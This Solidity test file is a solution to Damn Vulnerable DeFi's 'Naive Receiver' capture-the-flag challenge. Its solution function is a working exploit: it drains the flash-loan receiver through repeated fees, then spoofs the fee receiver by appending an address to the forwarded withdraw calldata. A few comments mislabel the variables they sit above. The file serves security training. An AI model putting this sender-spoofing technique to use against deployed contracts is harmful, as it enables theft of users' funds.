// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
	// Generate address from string "deployer"
    address deployer = makeAddr("deployer");
	// Generate address from string "recovery"
    address recovery = makeAddr("recovery");
	//声明状态变量：player用做当前闯关用户地址
    address player;
	// State variable: player address for the challenge
    uint256 playerPk;
	
	// Constant: Initial WETH balance of NaiveReceiverPool
    uint256 constant WETH_IN_POOL = 1000e18;
	// Constant: Initial WETH balance of NaiveReceiverPool
    uint256 constant WETH_IN_RECEIVER = 10e18;
	
	// Declaration of NaiveReceiverPool contract variable
    NaiveReceiverPool pool;
	// WETH token instance
    WETH weth;
    FlashLoanReceiver receiver;
	// BasicForwarder instance
    BasicForwarder forwarder;

	// Modifier: Executes before the target test function
    modifier checkSolvedByPlayer() {
		// Start pranking as player (both msg.sender and tx.origin are set to player)
        vm.startPrank(player, player);
		
		// Execute test_naiveReceiver() test body
        _;
		
		// Stop pranking player
        vm.stopPrank();
		
		// Call _isSolved() to verify challenge conditions
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {// Generate player private key (playerPk) and public address (player)
		// Generate player private key (playerPk) and public address (player)
        (player, playerPk) = makeAddrAndKey("player");
		// Start hoax as deployer (impersonates deployer and funds 1 ETH if balance is low)
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
		
		// Deposit 10 ETH to convert to 10 WETH
        weth.deposit{value: WETH_IN_RECEIVER}();
		// Transfer 10 WETH to receiver contract
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

		// Stop impersonating deployer
        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);// Assert pool contract balance equals 1000 WETH
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);// Assert receiver contract balance equals 10 WETH

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);// Assert maximum flash loan equals 1000 WETH
        assertEq(pool.flashFee(address(weth), 0), 1 ether);// Assert flash loan fee equals 1 WETH
        assertEq(pool.feeReceiver(), deployer);// Assert feeReceiver address is deployer

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));// Expect revert with selector 0x48f5c3ed
        receiver.onFlashLoan(// Verify direct call to onFlashLoan() reverts
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // 1. Prepare calldata array for 11 sub-calls
		bytes[] memory calldatas = new bytes[](11);

		// Sub-calls 1 to 10: Invoke flashLoan 10 times to drain 10 WETH in fees from receiver into pool
		for (uint256 i = 0; i < 10; i++) {
			calldatas[i] = abi.encodeWithSelector(
				pool.flashLoan.selector,
				address(receiver),
				address(weth),
				0,
				""
			);
		}

		// Sub-call 11: Construct withdraw(1010 ether, recovery)
		bytes memory withdrawCalldata = abi.encodeWithSelector(
			pool.withdraw.selector,
			1010 ether, // 1000 initial + 10 drained fees
			payable(recovery)
		);

		// Core Exploit: Append feeReceiver (deployer) 20-byte address to the tail of withdrawCalldata!
		calldatas[10] = abi.encodePacked(withdrawCalldata, pool.feeReceiver());

		// 2. Package all 11 sub-calls into multicall
		bytes memory multicallData = abi.encodeWithSelector(
			pool.multicall.selector,
			calldatas
		);

		// 3. Construct BasicForwarder Request struct (signed by player)
		BasicForwarder.Request memory request = BasicForwarder.Request({
			from: player,
			target: address(pool),
			value: 0,
			gas: 3000000,
			nonce: forwarder.nonces(player),
			deadline: block.timestamp + 1 days,
			data: multicallData
		});

		// 4. Perform off-chain EIP-712 signature (using player private key)
		bytes32 requestHash = keccak256(
			abi.encodePacked(
				"\x19\x01",
				forwarder.domainSeparator(),
				forwarder.getDataHash(request)
			)
		);
		
		// Sign requestHash following Foundry cheats
		(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
		bytes memory signature = abi.encodePacked(r, s, v);

		// 5. Relayer/Player submits transaction via Forwarder to trigger the full exploit!
		forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);// Assert player transaction count (nonce) <= 2

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");// Assert receiver balance == 0

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");// Assert pool balance == 0

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");// Assert recovery balance == 1010 WETH
    }
}
